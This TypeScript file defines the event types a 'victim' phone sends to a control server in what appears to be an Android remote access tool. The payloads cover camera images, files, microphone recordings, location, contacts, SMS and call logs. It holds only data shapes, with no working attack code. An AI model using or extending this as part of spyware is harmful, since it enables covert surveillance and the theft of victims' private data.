import { type VictimOrder } from '../enums/VictimOrder';

export interface CameraItem {
    name: string;
    id: number;
}

export type CameraOrderPayload =
    | { image: undefined; buffer: undefined; camList: true; list: CameraItem[] }
    | {
          camList: undefined;
          image: true;
          buffer: ArrayBuffer;
      };

export type FileManagerPayload = FileListItem[] | FilePayload;

export interface FileListItem {
    name: string;
    isDir: boolean;
    path: string;
}
export interface FilePayload {
    file: true;
    name: string;
    buffer: ArrayBuffer;
}

export interface LocationPayload {
    enable: boolean;
    lat: number;
    lng: number;
}

export interface ContactsPayload {
    contactsList: ContactItem[];
}

export interface ContactItem {
    phoneNo: string;
    name: string;
}

export type SMSPayload =
    | boolean
    | {
          smsList: SMSItem[];
      };

export interface SMSItem {
    phoneNo: string;
    msg: string;
}

export interface CallLogPayload {
    callsList: CallLogItem[];
}

export interface CallLogItem {
    phoneNo: string;
    name: string;
    duration: string;
    type: number;
}

type OrderCallback<T> = (data: T) => void;

export interface IVictimToServerEvents {
    [VictimOrder.CAMERA]: OrderCallback<CameraOrderPayload>;
    [VictimOrder.FILE_MANAGER]: OrderCallback<FileManagerPayload>;
    [VictimOrder.MICROPHONE]: OrderCallback<FilePayload>;
    [VictimOrder.LOCATION]: OrderCallback<LocationPayload>;
    [VictimOrder.CONTACTS]: OrderCallback<ContactsPayload>;
    [VictimOrder.SMS]: OrderCallback<SMSPayload>;
    [VictimOrder.CALLS]: OrderCallback<CallLogPayload>;
}
